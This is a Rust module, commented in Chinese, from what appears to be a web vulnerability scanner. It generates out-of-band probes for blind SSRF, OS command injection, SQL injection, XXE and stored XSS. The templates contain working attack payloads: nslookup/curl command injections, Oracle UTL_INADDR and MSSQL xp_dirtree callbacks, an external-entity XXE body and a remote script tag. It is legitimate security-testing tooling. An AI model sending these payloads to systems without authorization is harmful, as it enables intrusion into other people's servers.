//! OOB(带外)盲注探测生成 —— 把一个**带外回连域名**塞进各类盲漏洞 payload。
//!
//! 与 [`active`](crate::active) 的「基于响应」探测不同:盲漏洞在响应里看不到任何回显,
//! 确认靠「目标服务器主动回连我们控制的带外域名」。本模块负责**构造**这些 payload(纯函数),
//! 真正发送 + 轮询带外服务器 + 关联由 UI runner 完成(配合 `scry_oob`)。
//!
//! 覆盖盲漏洞类:
//! - **盲 SSRF**:URL 类参数注入 `http://<oob>/`,服务器代取 → 回连。
//! - **盲 OS 命令注入**:`;nslookup <oob>;` / `$(curl http://<oob>)` 等,命令执行 → DNS/HTTP 回连。
//! - **盲 SQL 注入(带外)**:DBMS 特有的外联函数(Oracle `UTL_INADDR`、MSSQL `xp_dirtree`…)→ 回连。
//! - **盲 XXE**:XML 体替换为外部实体 `SYSTEM "http://<oob>/"` → 解析器拉取 → 回连。
//! - **盲打 XSS**:存储型字段注入 `"><script src=//<oob>></script>`,他人(管理员)浏览时 → 回连。

use scry_analyze::parse_query;
use scry_core::HttpFlow;

use crate::active::{
    is_ssrf_param, looks_like_xml, mutate_query, reset_response, set_content_length,
};
use crate::types::Severity;

/// 盲漏洞类型(带外确认)。
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum OobProbeKind {
    /// 盲 SSRF(服务端请求伪造,无回显)。
    BlindSsrf,
    /// 盲 OS 命令注入(无回显,靠回连确认)。
    BlindRce,
    /// 盲 SQL 注入(带外通道,DBMS 外联函数)。
    BlindSqli,
    /// 盲 XXE(外部实体拉取带外 URL)。
    BlindXxe,
    /// 盲打 XSS(存储型 / 延迟触发,他人浏览时回连)。
    BlindXss,
}

impl OobProbeKind {
    /// 命中(收到回连)时的发现规则 id。
    pub fn rule_id(self) -> &'static str {
        match self {
            OobProbeKind::BlindSsrf => "oob-blind-ssrf",
            OobProbeKind::BlindRce => "oob-blind-rce",
            OobProbeKind::BlindSqli => "oob-blind-sqli",
            OobProbeKind::BlindXxe => "oob-blind-xxe",
            OobProbeKind::BlindXss => "oob-blind-xss",
        }
    }

    /// 命中时的发现标题(英文 key,界面 `lang.t()` 翻译)。
    pub fn title(self) -> &'static str {
        match self {
            OobProbeKind::BlindSsrf => "Blind SSRF (out-of-band)",
            OobProbeKind::BlindRce => "Blind OS command injection (out-of-band)",
            OobProbeKind::BlindSqli => "Blind SQL injection (out-of-band)",
            OobProbeKind::BlindXxe => "Blind XXE (out-of-band)",
            OobProbeKind::BlindXss => "Blind / stored XSS (out-of-band)",
        }
    }

    /// 命中严重度。带外确认 = 真实漏洞,普遍判高危/严重。
    pub fn severity(self) -> Severity {
        match self {
            OobProbeKind::BlindRce | OobProbeKind::BlindSqli => Severity::Critical,
            OobProbeKind::BlindSsrf | OobProbeKind::BlindXxe => Severity::High,
            OobProbeKind::BlindXss => Severity::High,
        }
    }
}

/// 一个带外探测:变异请求流 + 关联用的带外 id。
#[derive(Clone, Debug)]
pub struct OobProbe {
    pub kind: OobProbeKind,
    /// 被注入的参数名(XXE 走 body 填 `body`)。
    pub param: String,
    /// 本探测使用的带外唯一 id(= `OobPayload::id`,收到回连后据此关联回本探测)。
    pub oob_id: String,
    /// 变异后的请求流(响应已清空,可直接喂 replay)。
    pub flow: HttpFlow,
}

/// OS 命令注入回连模板(`{H}` = 带外主机名)。混用 DNS(nslookup,仅需 DNS 出口最可靠)+ HTTP。
const RCE_TEMPLATES: [&str; 3] = [
    ";nslookup {H};",
    "|nslookup {H}",
    "$(curl http://{H}/)",
];

/// 盲 SQL 注入带外模板(`{H}` = 带外主机名)。DBMS 特有外联函数,best-effort 覆盖主流库。
const SQLI_OOB_TEMPLATES: [&str; 2] = [
    // Oracle:UTL_INADDR 解析带外主机名 → DNS 回连。
    "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS('{H}') FROM dual)||'",
    // MSSQL:xp_dirtree 访问 UNC 路径 → SMB/DNS 回连。
    "';DECLARE @q VARCHAR(255);SET @q='\\\\{H}\\x';EXEC master..xp_dirtree @q;--",
];

/// 盲打 XSS 模板(`{H}` = 带外主机名):加载带外脚本,存储后他人浏览即回连。
const XSS_OOB_TEMPLATE: &str = "\"><script src=//{H}></script>";

/// 盲 XXE 外部实体模板(`{H}` = 带外主机名):SYSTEM 指向带外 HTTP URL。
const XXE_OOB_TEMPLATE: &str =
    r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://{H}/x">]><r>&xxe;</r>"#;

/// 由基准流生成带外盲注探测。
///
/// `alloc` 是带外域名分配器:每调用一次返回一个全新的一次性 `(host, id)`(由 `scry_oob` 会话提供)。
/// 每个具体 payload 都分配独立带外域名 → 收到回连时能精确关联到「哪个参数 / 哪种漏洞 / 哪条 payload」。
pub fn generate_oob_probes(
    base: &HttpFlow,
    mut alloc: impl FnMut() -> (String, String),
) -> Vec<OobProbe> {
    let mut out = Vec::new();

    for (k, v) in parse_query(&base.path) {
        // 盲 RCE:对每个参数都试(命令注入点不限语义)。
        for tmpl in RCE_TEMPLATES {
            let (host, id) = alloc();
            let payload = format!("{v}{}", tmpl.replace("{H}", &host));
            out.push(query_probe(base, OobProbeKind::BlindRce, &k, &payload, id));
        }
        // 盲 SQLi(带外):对每个参数都试。
        for tmpl in SQLI_OOB_TEMPLATES {
            let (host, id) = alloc();
            let payload = format!("{v}{}", tmpl.replace("{H}", &host));
            out.push(query_probe(base, OobProbeKind::BlindSqli, &k, &payload, id));
        }
        // 盲打 XSS:对每个参数都试(回连确认存储/延迟触发)。
        {
            let (host, id) = alloc();
            let payload = format!("{v}{}", XSS_OOB_TEMPLATE.replace("{H}", &host));
            out.push(query_probe(base, OobProbeKind::BlindXss, &k, &payload, id));
        }
        // 盲 SSRF:仅对疑似 URL 参数(整值替换为带外 URL)。
        if is_ssrf_param(&k) {
            let (host, id) = alloc();
            let payload = format!("http://{host}/");
            out.push(query_probe(base, OobProbeKind::BlindSsrf, &k, &payload, id));
        }
    }

    // 盲 XXE:仅当请求体像 XML 时替换为外部实体。
    if looks_like_xml(base) {
        let (host, id) = alloc();
        let mut flow = base.clone();
        flow.req_body = XXE_OOB_TEMPLATE.replace("{H}", &host).into_bytes();
        set_content_length(&mut flow);
        reset_response(&mut flow);
        out.push(OobProbe {
            kind: OobProbeKind::BlindXxe,
            param: "body".to_string(),
            oob_id: id,
            flow,
        });
    }

    out
}

/// 构造一个「查询参数注入」类的带外探测流。
fn query_probe(
    base: &HttpFlow,
    kind: OobProbeKind,
    key: &str,
    payload: &str,
    oob_id: String,
) -> OobProbe {
    let mut flow = base.clone();
    flow.path = mutate_query(&base.path, key, payload);
    reset_response(&mut flow);
    OobProbe {
        kind,
        param: key.to_string(),
        oob_id,
        flow,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn base() -> HttpFlow {
        HttpFlow::request(
            "GET",
            "https",
            "ex.com",
            443,
            "/fetch?url=http://a.com&q=1",
            vec![],
            vec![],
        )
    }

    /// 顺序分配器:产出可预测的 host/id,便于断言。
    fn seq_alloc() -> impl FnMut() -> (String, String) {
        let mut n = 0usize;
        move || {
            n += 1;
            let id = format!("id{n:031}"); // 33 字符
            (format!("{id}.oast.fun"), id)
        }
    }

    #[test]
    fn generates_per_param_blind_probes() {
        let probes = generate_oob_probes(&base(), seq_alloc());
        // 每参数:3 RCE + 2 SQLi + 1 XSS = 6;url 参数额外 1 SSRF。
        // 参数 url(7,含 SSRF) + 参数 q(6) = 13。
        assert_eq!(probes.len(), 13);
        assert_eq!(
            probes.iter().filter(|p| p.kind == OobProbeKind::BlindSsrf).count(),
            1
        );
        assert_eq!(
            probes.iter().filter(|p| p.kind == OobProbeKind::BlindRce).count(),
            6
        );
        // 每个探测的 oob_id 唯一。
        let mut ids: Vec<&str> = probes.iter().map(|p| p.oob_id.as_str()).collect();
        ids.sort();
        ids.dedup();
        assert_eq!(ids.len(), probes.len());
    }

    #[test]
    fn ssrf_only_on_url_params() {
        let b = HttpFlow::request("GET", "https", "ex.com", 443, "/p?name=bob", vec![], vec![]);
        let probes = generate_oob_probes(&b, seq_alloc());
        // name 非 URL 参数 → 无 SSRF;3 RCE + 2 SQLi + 1 XSS = 6。
        assert_eq!(probes.len(), 6);
        assert!(!probes.iter().any(|p| p.kind == OobProbeKind::BlindSsrf));
    }

    #[test]
    fn rce_payload_embeds_oob_host() {
        let probes = generate_oob_probes(&base(), seq_alloc());
        let rce = probes
            .iter()
            .find(|p| p.kind == OobProbeKind::BlindRce)
            .unwrap();
        // 带外 host 应出现在变异后的 path 里(经过 query 编码)。
        assert!(rce.flow.path.contains("oast.fun") || rce.flow.path.contains("oast%2Efun") || rce.flow.path.contains(&rce.oob_id));
    }

    #[test]
    fn xxe_only_on_xml_body() {
        let b = HttpFlow::request(
            "POST",
            "https",
            "ex.com",
            443,
            "/api",
            vec![("Content-Type".to_string(), "application/xml".to_string())],
            b"<?xml version=\"1.0\"?><foo>hi</foo>".to_vec(),
        );
        let probes = generate_oob_probes(&b, seq_alloc());
        assert_eq!(probes.len(), 1);
        assert_eq!(probes[0].kind, OobProbeKind::BlindXxe);
        let body = String::from_utf8(probes[0].flow.req_body.clone()).unwrap();
        assert!(body.contains("SYSTEM \"http://"));
        assert!(body.contains(".oast.fun"));
    }

    #[test]
    fn kind_metadata_is_consistent() {
        assert_eq!(OobProbeKind::BlindRce.severity(), Severity::Critical);
        assert_eq!(OobProbeKind::BlindSsrf.severity(), Severity::High);
        assert_eq!(OobProbeKind::BlindRce.rule_id(), "oob-blind-rce");
    }
}
